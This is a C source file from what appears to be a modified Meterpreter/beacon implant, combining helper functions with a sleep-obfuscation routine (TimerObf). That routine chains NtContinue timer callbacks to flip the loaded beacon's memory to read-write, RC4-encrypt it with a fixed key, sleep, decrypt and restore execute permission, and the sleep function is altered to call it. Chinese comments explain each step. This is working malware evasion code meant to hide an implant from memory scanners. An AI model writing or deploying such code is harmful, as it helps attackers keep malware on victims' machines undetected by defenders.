/*!
 * @file common.c
 * @brief Definitions for various common components used across the Meterpreter suite.
 */
#include "common.h"
//#include "../server/T1.c"
extern HINSTANCE BeaconAddr;
#define SLEEP_MAX_SEC (MAXDWORD / 1000)

/*!
 * @brief Returns a unix timestamp in UTC.
 * @return Integer value representing the UTC Unix timestamp of the current time.
 */
int current_unix_timestamp(void) {
	SYSTEMTIME system_time;
	FILETIME file_time;
	ULARGE_INTEGER ularge;

	GetSystemTime(&system_time);
	SystemTimeToFileTime(&system_time, &file_time);

	ularge.LowPart = file_time.dwLowDateTime;
	ularge.HighPart = file_time.dwHighDateTime;
	return (long)((ularge.QuadPart - 116444736000000000) / 10000000L);
}

DWORD TimerObf(DWORD Time) {
	CONTEXT Ctx = { 0 };
	CONTEXT RopProtRW = { 0 };
	CONTEXT RopMemEnc = { 0 };
	CONTEXT RopDelay = { 0 };
	CONTEXT RopMemDec = { 0 };
	CONTEXT RopProtX = { 0 };
	CONTEXT RopSetEvt = { 0 };
	USTRING Key = { 0 };
	USTRING Img = { 0 };
	CHAR    KeyBuf[16] = { 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55 };
	HANDLE hEvent = NULL;
	HANDLE hNewTimer = NULL;
	HANDLE hTimerQueue = NULL;
	DWORD OldProtect = NULL;
	DWORD BeaconSize = NULL;
	PVOID BeaconBase = NULL;
	PVOID NtContinue = NULL;
	PVOID SysFunc032 = NULL;
	
	hEvent = CreateEventW(0, 0, 0, 0);
	if (hEvent == NULL) return 0;

	BeaconBase = BeaconAddr;//Beacon在内存中的地址
	//Beacon的大小
	BeaconSize = ((PIMAGE_NT_HEADERS)((DWORD64)BeaconBase + ((PIMAGE_DOS_HEADER)BeaconBase)->e_lfanew))->OptionalHeader.SizeOfImage;

	dprintf("BeaconBase:%p BeaconSize:%d", BeaconBase, BeaconSize);
	hTimerQueue = CreateTimerQueue();//创建计时器队列
	if (hTimerQueue == NULL) return 0;

	NtContinue = GetProcAddress(GetModuleHandleA("Ntdll"), "NtContinue");//根据传入的CONTEXT结构调用对应的函数
	SysFunc032 = GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction032");//加密内存
	Ctx.ContextFlags = CONTEXT_FULL;
	Key.Buffer = KeyBuf;
	Key.Length = Key.MaximumLength = 16;

	Img.Buffer = BeaconBase;
	Img.Length = Img.MaximumLength = BeaconSize;
	//调用RtlCaptureContext得到当前线程的CONTEXT结构
	if (CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)RtlCaptureContext, &Ctx, 0, 0, WT_EXECUTEINTIMERTHREAD) == NULL) return 0;

	WaitForSingleObject(hEvent, 0x32);

	memcpy(&RopProtRW, &Ctx, sizeof(CONTEXT));
	memcpy(&RopMemEnc, &Ctx, sizeof(CONTEXT));
	memcpy(&RopDelay, &Ctx, sizeof(CONTEXT));
	memcpy(&RopMemDec, &Ctx, sizeof(CONTEXT));
	memcpy(&RopProtX, &Ctx, sizeof(CONTEXT));
	memcpy(&RopSetEvt, &Ctx, sizeof(CONTEXT));

	//VirtualProtect(BeaconBase,BeaconSize,PAGE_READWRITE,&OldProtect);
	RopProtRW.Rsp -= 8;
	RopProtRW.Rip = (DWORD64)VirtualProtect;
	RopProtRW.Rcx = (DWORD64)BeaconBase;
	RopProtRW.Rdx = (DWORD64)BeaconSize;
	RopProtRW.R8 = PAGE_READWRITE;
	RopProtRW.R9 = (DWORD64)&OldProtect;
	//SystemFunction032(&Img,&key)
	RopMemEnc.Rsp -= 8;
	RopMemEnc.Rip = (DWORD64)SysFunc032;
	RopMemEnc.Rcx = (DWORD64)&Img;
	RopMemEnc.Rdx = (DWORD64)&Key;
	//WaitForSingleObject(GetCurrentProcess(),Time)
	RopDelay.Rsp -= 8;
	RopDelay.Rip = (DWORD64)WaitForSingleObject;
	RopDelay.Rcx = (DWORD64)GetCurrentProcess();
	RopDelay.Rdx = Time;
	//SystemFunction032(&Img,&key)
	RopMemDec.Rsp -= 8;
	RopMemDec.Rip = (DWORD64)SysFunc032;
	RopMemDec.Rcx = (DWORD64)&Img;
	RopMemDec.Rdx = (DWORD64)&Key;
	//VirtualProtect(BeaconBase,BeaconSize,PAGE_EXECUTE_READWRITE,&OldProtect);
	RopProtX.Rsp -= 8;
	RopProtX.Rip = (DWORD64)VirtualProtect;
	RopProtX.Rcx = (DWORD64)BeaconBase;
	RopProtX.Rdx = (DWORD64)BeaconSize;
	RopProtX.R8 = PAGE_EXECUTE_READWRITE;
	RopProtX.R9 = (DWORD64)&OldProtect;
	//SetEvent(hEvent);
	RopSetEvt.Rsp -= 8;
	RopSetEvt.Rip = (DWORD64)SetEvent;
	RopSetEvt.Rcx = (DWORD64)hEvent;

	CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopProtRW, 100, 0, WT_EXECUTEINTIMERTHREAD);
	CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopMemEnc, 200, 0, WT_EXECUTEINTIMERTHREAD);
	CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopDelay, 300, 0, WT_EXECUTEINTIMERTHREAD);
	CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopMemDec, 400, 0, WT_EXECUTEINTIMERTHREAD);
	CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopProtX, 500, 0, WT_EXECUTEINTIMERTHREAD);
	CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopSetEvt, 600, 0, WT_EXECUTEINTIMERTHREAD);

	WaitForSingleObject(hEvent, INFINITE);

	DeleteTimerQueue(hTimerQueue);
}

/*!
 * @brief Sleep for the given number of seconds.
 * @param seconds DWORD value representing the number of seconds to sleep.
 * @remark This was implemented so that extended sleep times can be used (beyond the
 *         49 day limit imposed by Sleep()).
 */

VOID sleep(DWORD seconds)
{
	while (seconds > SLEEP_MAX_SEC)
	{
		Sleep(SLEEP_MAX_SEC * 1000);
		seconds -= SLEEP_MAX_SEC;
	}
	TimerObf(seconds * 1000);
	//Sleep(seconds * 1000);
}

VOID xor_bytes(BYTE xorKey[4], LPBYTE buffer, DWORD bufferSize)
{
	dprintf("[XOR] XORing %u bytes with key %02x%02x%02x%02x", bufferSize, xorKey[0], xorKey[1], xorKey[2], xorKey[3]);
	for (DWORD i = 0; i < bufferSize; ++i)
	{
		buffer[i] ^= xorKey[i % 4];
	}
}

VOID rand_xor_key(BYTE buffer[4])
{
	static BOOL initialised = FALSE;
	if (!initialised)
	{
		srand((unsigned int)time(NULL));
		initialised = TRUE;
	}

	buffer[0] = (rand() % 254) + 1;
	buffer[1] = (rand() % 254) + 1;
	buffer[2] = (rand() % 254) + 1;
	buffer[3] = (rand() % 254) + 1;
}

BOOL is_null_guid(BYTE guid[sizeof(GUID)])
{
	return memcmp(guid, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", sizeof(guid)) == 0 ? TRUE : FALSE;
}